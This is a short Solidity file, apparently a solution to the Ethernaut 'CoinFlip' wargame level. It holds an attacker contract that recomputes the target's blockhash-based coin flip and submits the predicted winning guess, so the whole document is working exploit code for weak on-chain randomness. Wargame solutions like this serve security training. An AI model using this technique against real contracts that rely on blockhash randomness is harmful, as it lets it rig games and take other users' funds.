pragma solidity ^0.4.18;

contract CoinFlip {
  function CoinFlip() public {}
  function flip(bool _guess) public returns (bool) {}
}

contract CoinFlipCheater{
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function hack(address param) public{ /*param Is Your Zepplin Main Contract Address*/
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = (coinFlip==1);
        CoinFlip target = CoinFlip(param);
        target.flip(side);
    }
}